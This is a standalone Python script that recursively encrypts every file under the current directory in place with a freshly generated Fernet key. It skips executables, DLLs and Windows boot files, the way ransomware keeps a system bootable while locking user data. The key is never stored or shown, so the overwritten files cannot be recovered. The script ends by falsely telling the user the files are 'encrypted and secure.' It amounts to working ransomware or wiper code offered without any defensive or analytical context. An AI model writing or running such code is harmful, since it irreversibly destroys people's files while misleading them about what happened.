import os
import sys
import cryptography
from cryptography.fernet import Fernet

def get_file_extension(file_path):
    return os.path.splitext(file_path)[1].lower()

def is_system_critical_file(file_path):
    system_critical_files = [
        "boot.ini",
        "ntldr",
        "ntdetect.com",
        "bootmgr"
    ]

    return os.path.basename(file_path) in system_critical_files

def encrypt_file(file_path, key):
    excluded_extensions = [".exe", ".dll"]
    if get_file_extension(file_path) in excluded_extensions:
        return

    if is_system_critical_file(file_path):
        return


    with open(file_path, "rb") as file:
        plaintext = file.read()

    cipher = Fernet(key)
    ciphertext = cipher.encrypt(plaintext)

    with open(file_path, "wb") as file:
        file.write(ciphertext)

def encrypt_directory(directory, key):
    for dirpath, dirnames, filenames in os.walk(directory):
        for filename in filenames:
            file_path = os.path.join(dirpath, filename)
            encrypt_file(file_path, key)

key = Fernet.generate_key()
encrypt_directory(".", key)

print("Your files are now encrypted and secure!")
